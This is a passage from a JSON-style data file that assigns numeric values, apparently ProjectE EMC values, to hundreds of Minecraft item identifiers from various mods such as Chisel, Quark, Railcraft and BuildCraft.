  ""chisel:cobblestone|10"": 1,
  ""minecraft:torch|0"": 9,
  ""chisel:cobblestone|11"": 1,
  ""quark:stained_clay_tiles_white_slab|0"": 32,
  ""chiselsandbits:chisel_stone|0"": 5,
  ""chisel:cobblestone|12"": 1,
  ""chisel:cobblestone|13"": 1,
  ""chisel:cobblestone|14"": 1,
  ""chisel:cobblestone|15"": 1,
  ""ironchest:vanilla_copper_shulker_upgrade|0"": 3072,
  ""galacticraftcore:slab_gc_half|4"": 2,
  ""galacticraftcore:slab_gc_half|2"": 1,
  ""chisel:limestone2|7"": 1,
  ""extratrees:doors.eucalyptus|0"": 16,
  ""forestry:fence.gates.maple|0"": 32,
  ""minecraft:record_mellohi|0"": 2048,
  ""minecraft:fish|0"": 64,
  ""minecraft:fish|1"": 64,
  ""minecraft:fish|2"": 64,
  ""minecraft:fish|3"": 64,
  ""forestry:fence.gates.willow|0"": 32,
  ""projectred-exploration:ruby_axe|0"": 3080,
  ""quark:stone_granite_bricks_slab|0"": 8,
  ""railcraft:pearlized_slab|0"": 64,
  ""railcraft:pearlized_slab|1"": 64,
  ""minecraft:stone_shovel|0"": 9,
  ""minecraft:beetroot|0"": 64,
  ""minecraft:saddle|0"": 192,
  ""quark:vertical_planks|1"": 8,
  ""quark:vertical_planks|0"": 8,
  ""quark:vertical_planks|3"": 8,
  ""minecraft:wooden_door|0"": 16,
  ""quark:vertical_planks|2"": 8,
  ""quark:vertical_planks|5"": 8,
  ""quark:vertical_planks|4"": 8,
  ""projecte:item.pe_covalence_dust|1"": 8,
  ""projecte:item.pe_covalence_dust|0"": 1,
  ""projecte:item.pe_covalence_dust|2"": 208,
  ""quark:lit_lamp|0"": 1860,
  ""mocreatures:mossy_cobbled_deep_wyvstone|0"": 2,
  ""minecraft:melon_seeds|0"": 16,
  ""extratrees:stairs.pinkivory|0"": 6,
  ""railcraft:abyssal_brick_stairs|0"": 24,
  ""quark:polished_netherrack|0"": 4,
  ""quark:polished_netherrack|1"": 4,
  ""minecraft:golden_carrot|0"": 1880,
  ""minecraft:quartz|0"": 256,
  ""quark:stained_clay_tiles_green_stairs|0"": 48,
  ""ironchest:copper_silver_chest_upgrade|0"": 4224,
  ""extratrees:fence.gates.locust|0"": 32,
  ""quark:stained_clay_tiles_green_slab|0"": 32,
  ""quark:red_sandstone_bricks_slab|0"": 2,
  ""railcraft:frostbound_brick_stairs|0"": 84,
  ""minecraft:jungle_fence|0"": 13,
  ""minecraft:red_sandstone|1"": 4,
  ""minecraft:red_sandstone|0"": 4,
  ""minecraft:red_sandstone|2"": 4,
  ""forestry:stairs.lime|0"": 6,
  ""quark:stone_granite_bricks_stairs|0"": 12,
  ""projectred-exploration:peridot_axe|0"": 3080,
  ""buildcrafttransport:pipe_emerald_item|1"": 4096,
  ""buildcrafttransport:pipe_emerald_item|2"": 4096,
  ""buildcrafttransport:pipe_emerald_item|3"": 4096,
  ""buildcrafttransport:pipe_emerald_item|4"": 4096,
  ""minecraft:porkchop|0"": 64,
  ""buildcrafttransport:pipe_emerald_item|5"": 4096,
  ""minecraft:end_stone|0"": 1,
  ""buildcrafttransport:pipe_emerald_item|6"": 4096,
  ""buildcrafttransport:pipe_emerald_item|7"": 4096,
  ""buildcrafttransport:pipe_emerald_item|8"": 4096,
  ""buildcrafttransport:pipe_emerald_item|9"": 4096,
  ""buildcrafttransport:pipe_emerald_item|10"": 4096,
  ""buildcrafttransport:pipe_emerald_item|11"": 4096,
  ""buildcrafttransport:pipe_emerald_item|12"": 4096,
  ""buildcrafttransport:pipe_emerald_item|13"": 4096,
  ""buildcrafttransport:pipe_emerald_item|14"": 4096,
  ""buildcrafttransport:pipe_emerald_item|15"": 4096,
  ""buildcrafttransport:pipe_emerald_item|16"": 4096,
  ""ic2:blockrubwood|0"": 32,
  ""minecraft:redstone_torch|0"": 68,
  ""botany:trowel_wood|0"": 13,
  ""projectred-exploration:ruby_saw|0"": 2060,
  ""extratrees:fence.gates.eucalyptus|0"": 32,
  ""minecraft:prismarine_shard|0"": 256,
  ""extratrees:fence.gates.olive|0"": 32,
  ""quark:elder_prismarine_dark_slab|0"": 520,
  ""forestry:fence.gates.mahoe|0"": 32,
  ""quark:icy_stone_stairs|0"": 48,
  ""extratrees:stairs.hickory|0"": 6,
  ""minecraft:sugar|0"": 32,
  ""minecraft:prismarine|2"": 2064,
  ""quark:jungle_button|0"": 8,
  ""minecraft:prismarine|0"": 1024,
  ""minecraft:prismarine|1"": 2304,
  ""minecraft:gravel|0"": 4,
  ""extratrees:doors.hemlock|0"": 16,
  ""quark:paper_wall_big|0"": 20,
  ""quark:acacia_trapdoor|0"": 8,
  ""blockcraftery:editable_pressure_plate_player|0"": 16,
  ""quark:dark_prismarine_wall|0"": 2064,
  ""quark:soul_sandstone_bricks_slab|0"": 98,
  ""quark:polished_netherrack_bricks_stairs|0"": 3,
  ""quark:midori_block|0"": 8,
  ""quark:fire_stone_stairs|0"": 48,
  ""minecraft:yellow_flower|0"": 16,
  ""quark:stained_planks_cyan_slab|0"": 4,
  ""minecraft:iron_hoe|0"": 520,
  ""mocreatures:gleaming_glass|0"": 1,
  ""railcraft:sandy_slab|0"": 17,
  ""minecraft:record_blocks|0"": 2048,
  ""railcraft:sandy_slab|1"": 17,
  ""extratrees:fence.gates.elder|0"": 32,
  ""projecte:dm_pedestal|0"": 4653056,
  ""quark:polished_netherrack_bricks_wall|0"": 4,
  ""minecraft:potato|0"": 64,
  ""quark:prismarine_dark_stairs|0"": 1548,
  ""railcraft:sandy_paver_stairs|0"": 25,
  ""railcraft:dust|5"": 64,
  ""extratrees:doors.rosewood|0"": 16,
  ""railcraft:dust|3"": 16,
  ""railcraft:dust|2"": 72,
  ""projecte:nova_catalyst|0"": 1506,
  ""railcraft:dust|1"": 32,
  ""chisel:glassdyedred|4"": 1,
  ""extratrees:doors.ash|0"": 16,
  ""chisel:glassdyedred|5"": 1,
  ""mocreatures:mossy_cobbled_deep_wyvstone_wall|0"": 2,
  ""chisel:glassdyedred|0"": 1,
  ""chisel:glassdyedred|1"": 1,
  ""chisel:glassdyedred|2"": 1,
  ""extratrees:stairs.rowan|0"": 6,
  ""chisel:glassdyedred|3"": 1,
  ""minecraft:purple_glazed_terracotta|0"": 64,
  ""minecraft:iron_pickaxe|0"": 776,
  ""quark:custom_chest|0"": 64,
  ""chisel:planks-jungle|14"": 8,
  ""quark:custom_chest|1"": 64,
  ""chisel:planks-jungle|13"": 8,
  ""quark:custom_chest|2"": 64,
  ""chisel:planks-jungle|12"": 8,
  ""quark:custom_chest|3"": 64,
  ""chisel:planks-jungle|11"": 8,
  ""quark:custom_chest|4"": 64,
  ""chisel:planks-jungle|10"": 8,
  ""chisel:planks-jungle|9"": 8,
  ""chisel:planks-jungle|8"": 8,
  ""chisel:planks-jungle|7"": 8,
  ""quark:stained_clay_tiles_black_stairs|0"": 48,
  ""chisel:planks-jungle|6"": 8,
  ""chisel:planks-jungle|5"": 8,
  ""chisel:planks-jungle|4"": 8,
  ""blockcraftery:editable_block_reinforced|0"": 33,
  ""chisel:planks-jungle|3"": 8,
  ""chisel:planks-jungle|2"": 8,
  ""chisel:planks-jungle|1"": 8,
  ""chisel:planks-jungle|0"": 8,
  ""quark:stone_andesite_stairs|0"": 12,
  ""quark:quartz_wall|0"": 1024,
  ""minecraft:concrete_powder|2"": 4,
  ""minecraft:concrete_powder|3"": 4,
  ""minecraft:concrete_powder|0"": 8,
  ""minecraft:concrete_powder|1"": 4,
  ""minecraft:concrete_powder|6"": 4,
  ""minecraft:concrete_powder|7"": 6,
  ""minecraft:concrete_powder|4"": 4,
  ""minecraft:concrete_powder|5"": 6,
  ""minecraft:concrete_powder|10"": 57,
  ""minecraft:concrete_powder|11"": 110,
  ""minecraft:concrete_powder|8"": 4,
  ""minecraft:concrete_powder|9"": 57,
  ""minecraft:concrete_powder|14"": 4,
  ""minecraft:concrete_powder|15"": 4,
  ""minecraft:concrete_powder|12"": 18,
  ""minecraft:concrete_powder|13"": 3,
  ""minecraft:sand|0"": 1,
  ""minecraft:sand|1"": 1,
  ""minecraft:purpur_slab|0"": 96,
  ""projecte:alchemical_chest|0"": 8987,
  ""extratrees:stairs.yew|0"": 6,
  ""mocreatures:wyvwood_trapdoor|0"": 24,
  ""forestry:doors.kapok|0"": 16,
  ""minecraft:bowl|0"": 6,
  ""chisel:glassdyedlightblue|0"": 1,
  ""chisel:glassdyedlightblue|1"": 1,
  ""chisel:glassdyedlightblue|2"": 1,
  ""chisel:glassdyedlightblue|3"": 1,
  ""chisel:glassdyedlightblue|4"": 1,
  ""chisel:glassdyedlightblue|5"": 1,
  ""quark:stained_clay_tiles_silver_slab|0"": 32,
  ""quark:stained_planks_magenta_slab|0"": 4,
  ""translocators:diamond_nugget|0"": 910,
  ""quark:jungle_pressure_plate|0"": 16,
  ""quark:sandstone_new|2"": 4,
  ""forestry:stairs.ipe|0"": 6,
  ""quark:sandstone_new|3"": 4,
  ""quark:sandstone_new|0"": 4,
  ""minecraft:melon|0"": 16,
  ""quark:sandstone_new|1"": 4,
  ""quark:polished_stone|0"": 1,
  ""blockcraftery:editable_wall|0"": 8,
  ""quark:sandstone_new|4"": 196,
  ""quark:sandstone_new|5"": 196,
  ""minecraft:iron_door|0"": 512,
  ""minecraft:noteblock|0"": 128,
  ""quark:bark_jungle_stairs|0"": 24,
  ""chisel:glassdyedbrown|5"": 1,
  ""chisel:glassdyedbrown|4"": 1,
  ""minecraft:iron_helmet|0"": 1280,
  ""chisel:glassdyedbrown|1"": 1,
  ""chisel:glassdyedbrown|0"": 1,
  ""chisel:glassdyedbrown|3"": 1,
  ""chisel:glassdyedbrown|2"": 1,
  ""extratrees:doors.olive|0"": 16,
  ""minecraft:mutton|0"": 64,
  ""quark:stonebrick_wall|0"": 1,
  ""minecraft:record_far|0"": 2048,
  ""extratrees:doors.locust|0"": 16,
  ""minecraft:shulker_shell|0"": 2048,
  ""railcraft:abyssal_slab|1"": 16,
  ""railcraft:abyssal_slab|0"": 16,
  ""minecraft:wooden_pressure_plate|0"": 16,
  ""minecraft:white_glazed_terracotta|0"": 64,
  ""chisel:chisel_iron|0"": 260,
  ""forestry:fence.gates.citrus|0"": 32,
  ""blockcraftery:editable_block|0"": 8,
  ""extratrees:doors.pear|0"": 16,
  ""buildcrafttransport:pipe_lapis_item|11"": 1944,
  ""buildcrafttransport:pipe_lapis_item|10"": 1944,
  ""buildcrafttransport:pipe_lapis_item|9"": 1944,
  ""buildcrafttransport:pipe_lapis_item|8"": 1944,
  ""buildcrafttransport:pipe_lapis_item|15"": 1944,
  ""buildcrafttransport:pipe_lapis_item|14"": 1944,
  ""buildcrafttransport:pipe_lapis_item|13"": 1944,
  ""buildcrafttransport:pipe_lapis_item|12"": 1944,
  ""buildcrafttransport:pipe_lapis_item|3"": 1944,
  ""buildcrafttransport:pipe_lapis_item|2"": 1944,
  ""buildcrafttransport:pipe_lapis_item|1"": 1944,
  ""buildcrafttransport:pipe_lapis_item|7"": 1944,
  ""buildcrafttransport:pipe_lapis_item|6"": 1944,
  ""buildcrafttransport:pipe_lapis_item|5"": 1944,
  ""buildcrafttransport:pipe_lapis_item|4"": 1944,
  ""extratrees:doors.elder|0"": 16,
  ""ironchest:vanilla_iron_shulker_upgrade|0"": 4096,
  ""minecraft:iron_shovel|0"": 264,
  ""mocreatures:wyvwood_planks|0"": 8,
  ""buildcrafttransport:pipe_lapis_item|16"": 1944,
  ""minecraft:diamond_block|0"": 73728,
  ""minecraft:stone_slab|1"": 2,
  ""minecraft:stone_slab|6"": 2,
  ""minecraft:stone_slab|7"": 512,
  ""minecraft:stone_slab|4"": 32,
  ""minecraft:brick|0"": 16,
  ""projectred-exploration:golden_sickle|0"": 6148,
  ""quark:stained_planks_green_stairs|0"": 6,
  ""minecraft:book|0"": 160,
  ""chisel:glassdyedmagenta|2"": 1,
  ""chisel:glassdyedmagenta|3"": 1,
  ""chisel:glassdyedmagenta|0"": 1,
  ""chisel:glassdyedmagenta|1"": 1,
  ""chisel:glassdyedmagenta|4"": 1,
  ""chisel:glassdyedmagenta|5"": 1,
  ""irontanks:copper_iron_upgrade|0"": 641,
  ""minecraft:quartz_block|2"": 1024,
  ""minecraft:quartz_block|1"": 1024,
  ""minecraft:quartz_block|0"": 1024,
  ""minecraft:bone|0"": 144,
  ""minecraft:diamond_boots|0"": 32768,
  ""minecraft:spruce_door|0"": 16,
  ""quark:glowcelium|0"": 64,
  ""extratrees:fence.gates.iroko|0"": 32,
  ""quark:hardened_clay_tiles|0"": 64,
  ""quark:bark_oak_slab|0"": 16,
  ""minecraft:snowball|0"": 1,
  ""minecraft:red_flower|1"": 16,
  ""minecraft:red_flower|0"": 16,
  ""railcraft:bleachedbone_brick_stairs|0"": 162,
  ""minecraft:red_flower|3"": 16,
  ""minecraft:red_flower|2"": 16,
  ""minecraft:red_flower|5"": 16,
  ""minecraft:red_flower|4"": 16,
  ""minecraft:red_flower|7"": 16,
  ""minecraft:red_flower|6"": 16,
  ""minecraft:red_flower|8"": 16,
  ""quark:soul_sandstone_slab|0"": 98,
  ""cathedral:cathedral_railing_various|1"": 2,
  ""cathedral:cathedral_railing_various|2"": 2,
  ""cathedral:cathedral_railing_various|3"": 40,
  ""cathedral:cathedral_railing_various|4"": 2,
  ""cathedral:cathedral_railing_various|5"": 640,
  ""cathedral:cathedral_railing_various|7"": 2,
  ""cathedral:cathedral_railing_various|9"": 2,
  ""quark:stone_diorite_wall|0"": 16,
  ""mocreatures:cobbled_deep_wyvstone|0"": 1,
  ""quark:fire_stone_brick_slab|0"": 32,
  ""quark:charred_nether_brick_slab|0"": 57,
  ""ic2:blockrubsapling|0"": 32,
  ""extratrees:doors.hazel|0"": 16,
  ""railcraft:infernal|4"": 77,
  ""railcraft:infernal|5"": 53,
  ""railcraft:infernal|2"": 53,
  ""railcraft:infernal|3"": 53,
  ""railcraft:infernal|0"": 53,
  ""railcraft:infernal|1"": 53,
  ""minecraft:netherbrick|0"": 1,
  ""minecraft:enchanting_table|0"": 16800,
  ""ironchest:iron_chest|4"": 4164,
  ""ironchest:iron_chest|5"": 28753,
  ""ironchest:iron_chest|6"": 29257,
  ""ironchest:iron_chest|7"": 72,
  ""ironchest:iron_chest|0"": 2112,
  ""ironchest:iron_chest|1"": 12360,
  ""ironchest:iron_chest|2"": 28745,
  ""ironchest:iron_chest|3"": 1088,
  ""cathedral:cathedral_gargoyle_demon_redsandstone|0"": 265,
  ""forestry:fence.gates.walnut|0"": 32,
  ""quark:soul_sandstone_smooth_slab|0"": 98,
  ""projectred-core:resource_item|202"": 1024,
  ""projectred-core:resource_item|200"": 1024,
  ""projectred-core:resource_item|201"": 1024,
  ""minecraft:filled_map|0"": 1472,
  ""projectred-exploration:peridot_sickle|0"": 3076,
  ""quark:red_nether_brick_slab|0"": 25,
  ""extratrees:fence.gates.alder|0"": 32,
  ""minecraft:bed|15"": 174,
  ""minecraft:bed|14"": 174,
  ""minecraft:bed|13"": 171,
  ""minecraft:bed|12"": 216,
  ""minecraft:bed|11"": 492,
  ""minecraft:bed|10"": 333,
  ""minecraft:bed|9"": 330,
  ""minecraft:bed|8"": 174,
  ""minecraft:bed|7"": 180,
  ""minecraft:bed|6"": 174,
  ""minecraft:bed|5"": 177,
  ""minecraft:bed|4"": 174,
  ""minecraft:bed|3"": 174,
  ""minecraft:bed|2"": 174,
  ""minecraft:bed|1"": 174,
  ""minecraft:bed|0"": 168,
  ""extratrees:fence.gates.cedar|0"": 32,
  ""projectred-core:resource_item|250"": 1160,
  ""projectred-core:resource_item|251"": 768,
  ""extratrees:doors.logwood|0"": 16,
  ""projectred-core:resource_item|252"": 1280,
  ""chisel:laboratory|0"": 33,
  ""galacticraftcore:grating|0"": 96,
  ""quark:red_sandstone_wall|0"": 4,
  ""quark:sandy_bricks_slab|0"": 32,
  ""quark:custom_chest_trap|1"": 198,
  ""quark:custom_chest_trap|0"": 198,
  ""quark:custom_chest_trap|3"": 198,
  ""quark:custom_chest_trap|2"": 198,
  ""quark:custom_chest_trap|4"": 198,
  ""railcraft:bleachedbone|5"": 216,
  ""railcraft:bleachedbone|4"": 240,
  ""railcraft:bleachedbone|3"": 216,
  ""railcraft:bleachedbone|2"": 216,
  ""railcraft:bleachedbone|1"": 216,
  ""projectred-exploration:wooden_sickle|0"": 28,
  ""railcraft:bleachedbone|0"": 216,
  ""chiselsandbits:chisel_gold|0"": 2052,
  ""quark:soul_sandstone_stairs|0"": 147,
  ""quark:stained_clay_tiles_magenta_slab|0"": 32,
  ""minecraft:reeds|0"": 32,
  ""minecraft:leather_chestplate|0"": 512,
  ""galacticraftplanets:carbon_fragments|0"": 8,
  ""forestry:fence.gates.poplar|0"": 32,
  ""quark:prismarine_rough_wall|0"": 1024,
  ""quark:gravisand|0"": 129,
  ""projectred-core:resource_item|105"": 128,
  ""extratrees:fence.gates.apple|0"": 32,
  ""projectred-core:resource_item|102"": 512,
  ""projectred-core:resource_item|100"": 128,
  ""projectred-core:resource_item|101"": 256,
  ""minecraft:piston|0"": 348,
  ""quark:stone_limestone_bricks_wall|0"": 1,
  ""quark:stone_granite_stairs|0"": 12,
  ""minecraft:netherrack|0"": 1,
  ""quark:stone_andesite_bricks_wall|0"": 16,
  ""quark:stained_planks_white_slab|0"": 4,
  ""buildcraftfactory:tank|0"": 8,
  ""projectred-exploration:golden_saw|0"": 4108,
  ""ironchest:wood_copper_chest_upgrade|0"": 1032,
  ""extratrees:leaves.decorative.1|1"": 1,
  ""extratrees:leaves.decorative.2|0"": 1,
  ""extratrees:leaves.decorative.3|3"": 1,
  ""extratrees:leaves.decorative.4|2"": 1,
  ""extratrees:leaves.decorative.5|5"": 1,
  ""extratrees:leaves.decorative.1|0"": 1,
  ""extratrees:leaves.decorative.2|1"": 1,
  ""extratrees:leaves.decorative.3|2"": 1,
  ""extratrees:leaves.decorative.4|3"": 1,
  ""extratrees:leaves.decorative.5|4"": 1,
  ""extratrees:leaves.decorative.1|3"": 1,
  ""extratrees:leaves.decorative.2|2"": 1,
  ""extratrees:leaves.decorative.3|1"": 1,
  ""extratrees:leaves.decorative.4|0"": 1,
  ""extratrees:leaves.decorative.5|7"": 1,
  ""mocreatures:deep_wyvstone_pressure_plate|0"": 3,
  ""extratrees:leaves.decorative.1|2"": 1,
  ""extratrees:leaves.decorative.2|3"": 1,
  ""extratrees:leaves.decorative.3|0"": 1,
  ""extratrees:leaves.decorative.4|1"": 1,
  ""extratrees:leaves.decorative.5|6"": 1,
  ""thaumcraft:nugget|9"": 28,
  ""extratrees:leaves.decorative.1|5"": 1,
  ""extratrees:leaves.decorative.2|4"": 1,
  ""extratrees:leaves.decorative.3|7"": 1,
  ""extratrees:leaves.decorative.4|6"": 1,
  ""extratrees:leaves.decorative.5|1"": 1,
  ""extratrees:leaves.decorative.6|0"": 1,
  ""extratrees:leaves.decorative.1|4"": 1,
  ""extratrees:leaves.decorative.2|5"": 1,
  ""extratrees:leaves.decorative.3|6"": 1,
  ""extratrees:leaves.decorative.4|7"": 1,
  ""extratrees:leaves.decorative.5|0"": 1,
  ""extratrees:doors.box|0"": 16,
  ""extratrees:leaves.decorative.1|7"": 1,
  ""extratrees:leaves.decorative.2|6"": 1,
  ""extratrees:leaves.decorative.3|5"": 1,
  ""extratrees:leaves.decorative.4|4"": 1,
  ""extratrees:leaves.decorative.5|3"": 1,
  ""extratrees:leaves.decorative.1|6"": 1,
  ""extratrees:leaves.decorative.2|7"": 1,
  ""extratrees:leaves.decorative.3|4"": 1,
  ""extratrees:leaves.decorative.4|5"": 1,
  ""extratrees:leaves.decorative.5|2"": 1,
  ""extratrees:leaves.decorative.5|13"": 1,
  ""extratrees:leaves.decorative.1|9"": 1,
  ""extratrees:leaves.decorative.2|8"": 1,
  ""extratrees:leaves.decorative.3|11"": 1,
  ""extratrees:leaves.decorative.4|10"": 1,
  ""extratrees:leaves.decorative.1|8"": 1,
  ""extratrees:leaves.decorative.2|9"": 1,
  ""extratrees:leaves.decorative.3|10"": 1,
  ""extratrees:leaves.decorative.4|11"": 1,
  ""extratrees:leaves.decorative.5|12"": 1,
  ""quark:spruce_trapdoor|0"": 8,
  ""extratrees:leaves.decorative.2|10"": 1,
  ""extratrees:leaves.decorative.1|11"": 1,
  ""extratrees:leaves.decorative.3|9"": 1,
  ""extratrees:leaves.decorative.4|8"": 1,
  ""extratrees:leaves.decorative.5|15"": 1,
  ""extratrees:leaves.decorative.1|10"": 1,
  ""extratrees:leaves.decorative.2|11"": 1,
  ""extratrees:leaves.decorative.3|8"": 1,
  ""extratrees:leaves.decorative.4|9"": 1,
  ""extratrees:leaves.decorative.5|14"": 1,
  ""extratrees:leaves.decorative.1|13"": 1,
  ""extratrees:leaves.decorative.2|12"": 1,
  ""extratrees:leaves.decorative.3|15"": 1,
  ""extratrees:leaves.decorative.4|14"": 1,
  ""extratrees:leaves.decorative.5|9"": 1,
  ""extratrees:leaves.decorative.1|12"": 1,
  ""extratrees:leaves.decorative.2|13"": 1,
  ""extratrees:leaves.decorative.3|14"": 1,
  ""extratrees:leaves.decorative.4|15"": 1,
  ""extratrees:leaves.decorative.5|8"": 1,
  ""extratrees:leaves.decorative.1|15"": 1,
  ""extratrees:leaves.decorative.2|14"": 1,
  ""extratrees:leaves.decorative.3|13"": 1,
  ""extratrees:leaves.decorative.4|12"": 1,
  ""extratrees:leaves.decorative.5|11"": 1,
  ""extratrees:leaves.decorative.1|14"": 1,
  ""extratrees:leaves.decorative.2|15"": 1,
  ""extratrees:leaves.decorative.3|12"": 1,
  ""extratrees:leaves.decorative.4|13"": 1,
  ""extratrees:leaves.decorative.5|10"": 1,
  ""extratrees:leaves.decorative.0|14"": 1,
  ""minecraft:brewing_stand|0"": 1539,
  ""extratrees:leaves.decorative.0|15"": 1,
  ""extratrees:leaves.decorative.0|12"": 1,
  ""extratrees:leaves.decorative.0|13"": 1,
  ""extratrees:leaves.decorative.0|10"": 1,
  ""quark:red_sandstone_smooth_slab|0"": 2,
  ""extratrees:leaves.decorative.0|11"": 1,
  ""forestry:resource_storage|0"": 288,
  ""extratrees:leaves.decorative.0|8"": 1,
  ""extratrees:leaves.decorative.0|9"": 1,
  ""extratrees:leaves.decorative.0|6"": 1,
  ""blockcraftery:editable_trap_door_reinforced|0"": 66,
  ""extratrees:leaves.decorative.0|7"": 1,
  ""ic2:itemharz|0"": 64,
  ""mocreatures:wyvwood_button|0"": 16,
  ""extratrees:leaves.decorative.0|4"": 1,
  ""extratrees:leaves.decorative.0|5"": 1,
  ""extratrees:leaves.decorative.0|2"": 1,
  ""extratrees:leaves.decorative.0|3"": 1,
  ""extratrees:leaves.decorative.0|0"": 1,
  ""extratrees:leaves.decorative.0|1"": 1,
  ""chisel:bookshelf_acacia|0"": 504,
  ""extratrees:doors.banana|0"": 16,
  ""thaumcraft:flesh_block|0"": 288,
  ""mocreatures:wyvwood_log|0"": 32,
  ""minecraft:vine|0"": 8,
  ""minecraft:wooden_shovel|0"": 16,
  ""chisel:glass|15"": 1,
  ""chisel:glass|14"": 1,
  ""chisel:glass|13"": 1,
  ""chisel:glass|12"": 1,
  ""chisel:glass|11"": 1,
  ""chisel:glass|10"": 1,
  ""chisel:glass|9"": 1,
  ""chisel:glass|8"": 1,
  ""forestry:stairs.baobab|0"": 6,
  ""chisel:glass|7"": 1,
  ""chisel:glass|6"": 1,
  ""chisel:glass|5"": 1,
  ""chisel:glass|4"": 1,
  ""chisel:glass|3"": 1,
  ""chisel:glass|2"": 1,
  ""chisel:glass|1"": 1,
  ""chisel:glass|0"": 1,
  ""projecte:item.pe_klein_star|0"": 24576,
  ""projecte:item.pe_klein_star|1"": 98304,
  ""projecte:item.pe_klein_star|2"": 393216,
  ""projecte:item.pe_klein_star|3"": 1572864,
  ""projecte:item.pe_klein_star|4"": 6291456,
  ""projecte:item.pe_klein_star|5"": 25165824,
  ""cathedral:basalt_block_checkered|0"": 2,
  ""chisel:cobblestone1|5"": 1,
  ""chisel:cobblestone2|6"": 1,
  ""quark:stained_clay_tiles_cyan_stairs|0"": 48,
  ""chisel:cobblestone1|4"": 1,
  ""chisel:cobblestone2|7"": 1,
  ""chisel:cobblestone1|7"": 1,
  ""chisel:cobblestone2|4"": 1,
  ""chisel:cobblestone1|6"": 1,
  ""chisel:cobblestone2|5"": 1,
  ""chisel:cobblestone1|1"": 1,
  ""chisel:cobblestone2|2"": 1,
  ""quark:colored_flowerpot_pink|0"": 64,
  ""chisel:cobblestone1|0"": 1,
  ""chisel:cobblestone2|3"": 1,
  ""chisel:cobblestone1|3"": 1,
  ""chisel:cobblestone2|0"": 1,
  ""chisel:cobblestone1|2"": 1,
  ""chisel:cobblestone2|1"": 1,
  ""chisel:cobblestone1|9"": 1,
  ""irontanks:diamond_tank|0"": 22300,
  ""chisel:cobblestone1|8"": 1,
  ""chisel:cobblestone2|8"": 1,
  ""chisel:cobblestone2|9"": 1,
  ""quark:snow_bricks|0"": 1,
  ""quark:stained_planks|7"": 8,
  ""quark:stained_planks|6"": 8,
  ""quark:stained_planks|5"": 8,
  ""quark:stained_planks|4"": 8,
  ""quark:stained_planks|3"": 8,
  ""quark:stained_planks|2"": 8,
  ""forestry:doors.larch|0"": 16,
  ""quark:stained_planks|1"": 8,
  ""quark:stained_planks|0"": 8,
  ""quark:stained_planks|15"": 8,
  ""quark:stained_planks|14"": 8,
  ""quark:stained_planks|13"": 8,
  ""quark:stained_planks|12"": 8,
  ""quark:stained_planks|11"": 8,
  ""quark:stained_planks|10"": 8,
  ""mocreatures:wyvwood_stairs|0"": 6,
  ""quark:stained_planks|9"": 8,
  ""quark:stained_planks|8"": 8,
  ""blockcraftery:editable_slant|0"": 4,
  ""extratrees:fence.gates.maclura|0"": 32,
  ""extratrees:stairs.hornbeam|0"": 6,
  ""forestry:doors.balsa|0"": 16,
  ""chisel:planks-spruce|11"": 8,
  ""chisel:planks-spruce|10"": 8,
  ""chisel:planks-spruce|9"": 8,
  ""chisel:planks-spruce|8"": 8,
  ""chisel:planks-spruce|14"": 8,
  ""chisel:planks-spruce|13"": 8,
  ""chisel:planks-spruce|12"": 8,
  ""irontanks:gold_diamond_upgrade|0"": 18433,
  ""chisel:planks-spruce|3"": 8,
  ""chisel:planks-spruce|2"": 8,
  ""chisel:planks-spruce|1"": 8,
  ""chisel:planks-spruce|0"": 8,
  ""chisel:planks-spruce|7"": 8,
  ""chisel:planks-spruce|6"": 8,
  ""minecraft:stone_pickaxe|0"": 11,
  ""chisel:planks-spruce|5"": 8,
  ""chisel:planks-spruce|4"": 8,
  ""minecraft:red_mushroom|0"": 32,
  ""ironchest:copper_iron_shulker_upgrade|0"": 1156,
  ""minecraft:repeater|0"": 203,
  ""extratrees:fence.gates.elm|0"": 32,
  ""extratrees:stairs.eucalyptus|0"": 6,
  ""minecraft:redstone|0"": 64,
  ""minecraft:magma|0"": 128,
  ""quark:stained_planks_yellow_slab|0"": 4,
  ""projectred-exploration:peridot_hoe|0"": 2056,
  ""quark:red_nether_brick_stairs|0"": 37,
  ""minecraft:record_13|0"": 2048,
  ""minecraft:record_11|0"": 2048,
  ""minecraft:nether_brick_stairs|0"": 3,
  ""minecraft:trapdoor|0"": 8,
  ""minecraft:purpur_pillar|0"": 192,
  ""minecraft:dark_oak_fence|0"": 13,
  ""projecte:transmutation_table|0"": 260,
  ""cathedral:cathedral_gargoyle_demon_limestone|0"": 253,
  ""blockcraftery:editable_outer_corner|0"": 2,
  ""forestry:doors.papaya|0"": 16,
  ""minecraft:milk_bucket|0"": 784,
  ""quark:arrow_explosive|0"": 398,
  ""galacticraftcore:canister|1"": 448,
  ""galacticraftcore:canister|0"": 896,
  ""quark:elder_prismarine_wall|0"": 128,
  ""chisel:lavastone|0"": 9,
  ""quark:prismarine_slab|0"": 512,
  ""quark:gold_button|0"": 2056,
  ""minecraft:rabbit_foot|0"": 128,
  ""forestry:stairs.mahogany|0"": 6,
  ""projectred-exploration:iron_sickle|0"": 772,
  ""minecraft:gold_nugget|0"": 227,
  ""minecraft:double_plant|4"": 32,
  ""minecraft:double_plant|5"": 32,
  ""minecraft:double_plant|0"": 32,
  ""minecraft:double_plant|1"": 32,
  ""minecraft:double_plant|2"": 1,
  ""minecraft:double_plant|3"": 1,
  ""railcraft:abyssal|5"": 32,
  ""railcraft:abyssal|4"": 56,
  ""railcraft:abyssal|3"": 32,
  ""railcraft:abyssal|2"": 32,
  ""railcraft:abyssal|1"": 32,
  ""quark:stonebrick_mossy_slab|0"": 4,
  ""railcraft:abyssal|0"": 32,
  ""projecte:item.pe_fuel|2"": 8192,
  ""projecte:item.pe_fuel|0"": 512,
  ""projecte:item.pe_fuel|1"": 2048,
  ""quark:colored_flowerpot_yellow|0"": 64,
  ""minecraft:flint|0"": 4,
  ""minecraft:lead|0"": 40,
  ""minecraft:bow|0"": 48,
  ""forestry:fence.gates.lime|0"": 32,
  ""minecraft:fishing_rod|0"": 36,
  ""quark:world_stone_carved|5"": 1,
  ""forestry:fence.gates.cocobolo|0"": 32,
  ""quark:world_stone_carved|2"": 16,
  ""quark:world_stone_carved|1"": 16,
  ""minecraft:spruce_fence_gate|0"": 32,
  ""quark:world_stone_carved|0"": 16,
  ""minecraft:tallgrass|0"": 1,
  ""minecraft:tallgrass|1"": 1,
  ""minecraft:tallgrass|2"": 1,
  ""quark:stained_clay_tiles_magenta_stairs|0"": 48,
  ""minecraft:nether_wart|0"": 24,
  ""mocreatures:mossy_cobbled_wyvstone_slab|0"": 1,
  ""minecraft:sign|0"": 17,
  ""quark:elder_sea_lantern|0"": 3712,
  ""chisel:voidstone|0"": 37,
  ""minecraft:purpur_block|0"": 192,
  ""galacticraftcore:fluid_tank|0"": 2,
